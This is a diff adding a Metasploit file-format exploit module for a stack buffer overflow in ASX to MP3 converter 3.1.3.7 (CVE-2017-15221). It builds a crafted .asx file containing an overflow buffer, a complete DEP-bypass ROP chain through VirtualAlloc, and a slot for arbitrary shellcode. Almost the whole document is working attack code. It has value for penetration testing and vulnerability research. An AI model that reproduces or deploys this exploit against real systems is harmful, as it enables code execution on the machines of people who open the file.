@@ -1,0 +1,134 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "ASX to MP3 converter 3.1.3.7 - '.asx' Local Stack Overflow (DEP)",
+      'Description'    => %q{
+       This module exploits a stack buffer overflow in ASX to MP3 converter 3.1.3.7.
+       By constructing a specially crafted ASX file and attempting to convert it to an MP3 file in the
+       application, a buffer is overwritten, which allows for running shellcode.
+	   Tested on: Microsoft Windows 7 Enterprise, 6.1.7601 Service Pack 1 Build 7601, x64-based PC
+	              Microsoft Windows 10 Pro, 10.0.18362 N/A Build 18362, x64-based PC
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Maxim Guslyaev', # EDB POC, Metasploit Module
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2017-15221' ],
+          [ 'EDB', '47468' ]
+        ],
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [
+            'Windows 7 Enterprise/10 Pro',
+            {
+              'Ret' => 0x1002D038 # RET
+            }
+          ]
+        ],
+      'Payload'        =>
+        {
+          'BadChars' => "\x00\x09\x0a"
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => "Oct 06 2019",
+      'DefaultTarget'  => 0))
+
+    register_options(
+    [
+      OptString.new('FILENAME', [true, 'The malicious file name', 'music.asx'])
+    ])
+  end
+
+  def exploit
+  
+	buf = "http://"
+	buf += "A" * 17417 + [target.ret].pack("V") + "CCCC"
+
+	## Save allocation type (0x1000) in EDX
+	buf += [0x10047F4D].pack("V") # ADC EDX,ESI # POP ESI # RETN
+	buf += [0x11111111].pack("V")
+	buf += [0x10029B8C].pack("V") # XOR EDX,EDX # RETN
+	buf += [0x1002D493].pack("V") # POP EDX # RETN
+	buf += [0xEEEEFEEF].pack("V")
+	buf += [0x10047F4D].pack("V") # ADC EDX,ESI # POP ESI # RETN
+	buf += [0x41414141].pack("V")
+
+	## Save the address of VirtualAlloc() in ESI
+	buf += [0x1002fade].pack("V") # POP EAX # RETN [MSA2Mfilter03.dll] 
+	buf += [0x1004f060].pack("V") # ptr to &VirtualAlloc() [IAT MSA2Mfilter03.dll]
+	buf += [0x1003239f].pack("V") # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSA2Mfilter03.dll]
+	buf += [0x10040754].pack("V") # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN
+	buf += [0x41414141].pack("V")
+	buf += [0x41414141].pack("V")
+
+	## Save the size of the block in EBX
+	buf += [0x1004d881].pack("V") # XOR EAX,EAX # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x1003b34d].pack("V") # ADD EAX,29 # RETN
+	buf += [0x10034735].pack("V") # PUSH EAX # ADD AL,5D # MOV EAX,1 # POP EBX # RETN
+
+	## Save the address of (# ADD ESP,8 # RETN) in EBP
+	buf += [0x10031c6c].pack("V") # POP EBP # RETN
+	buf += [0x10012316].pack("V") # ADD ESP,8 # RETN
+	#buf += [0x1003df73].pack("V") # & PUSH ESP # RETN
+
+	## Save memory protection code (0x40) in ECX
+	buf += [0x1002ca22].pack("V") # POP ECX # RETN
+	buf += [0xFFFFFFFF].pack("V")
+	buf += [0x10031ebe].pack("V") # INC ECX # AND EAX,8 # RETN
+	buf += [0x10031ebe].pack("V") # INC ECX # AND EAX,8 # RETN
+	buf += [0x1002a5b7].pack("V") # ADD ECX,ECX # RETN
+	buf += [0x1002a5b7].pack("V") # ADD ECX,ECX # RETN
+	buf += [0x1002a5b7].pack("V") # ADD ECX,ECX # RETN
+	buf += [0x1002a5b7].pack("V") # ADD ECX,ECX # RETN
+	buf += [0x1002a5b7].pack("V") # ADD ECX,ECX # RETN
+	buf += [0x1002a5b7].pack("V") # ADD ECX,ECX # RETN
+
+	## Save ROP-NOP in EDI
+	buf += [0x1002e346].pack("V") # POP EDI # RETN
+	buf += [0x1002D038].pack("V") # RETN
+
+	## Save NOPs in EAX
+	#buf += [0x1003bca4].pack("V") # POP EAX # RETN [MSA2Mfilter03.dll] 
+	#buf += [0x90909090].pack("V") # nop
+
+	## Set up the EAX register to contain the address of # PUSHAD #RETN and JMP to this address
+	buf += [0x1002E516].pack("V") # POP EAX # RETN
+	buf += [0xA4E2F275].pack("V")
+	buf += [0x1003efe2].pack("V") # ADD EAX,5B5D5E5F # RETN
+	buf += [0x10040ce5].pack("V") # PUSH EAX # RETN
+
+	buf += "\x90" * 4
+	buf += [0x1003df73].pack("V") # & PUSH ESP # RETN
+	buf += "\x90" * 20
+	buf += payload.encoded
+
+    file_create(buf)
+	
+  end
+end
